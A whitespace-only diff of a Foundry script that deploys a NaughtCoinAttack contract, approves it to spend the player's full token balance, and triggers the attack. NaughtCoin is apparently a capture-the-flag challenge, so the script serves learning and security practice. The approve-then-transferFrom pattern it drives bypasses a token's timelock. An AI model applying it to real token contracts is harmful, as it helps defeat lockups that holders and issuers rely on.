@@ -10,16 +10,16 @@ contract NaughtCoinScript is Script {
     NaughtCoinAttack public attacker;
 
     function run() external {
-	vm.startBroadcast();
-	attacker = new NaughtCoinAttack();
-	console.log("NaughtCoinAttack Contract deployed to:", address(attacker));
-	uint256 balance = instance.balanceOf(msg.sender);
-	console.log("Player current balance:", balance);
-	bool result = instance.approve(address(attacker), balance);
-	console.log("Approved NaughtCoinAttack to use Player balance?", result);
-	console.log("Attacking...");
-	attacker.attack(address(instance));
-	console.log("Player new balance:", instance.balanceOf(msg.sender));
-	vm.stopBroadcast();
+        vm.startBroadcast();
+        attacker = new NaughtCoinAttack();
+        console.log("NaughtCoinAttack Contract deployed to:", address(attacker));
+        uint256 balance = instance.balanceOf(msg.sender);
+        console.log("Player current balance:", balance);
+        bool result = instance.approve(address(attacker), balance);
+        console.log("Approved NaughtCoinAttack to use Player balance?", result);
+        console.log("Attacking...");
+        attacker.attack(address(instance));
+        console.log("Player new balance:", instance.balanceOf(msg.sender));
+        vm.stopBroadcast();
     }
 }
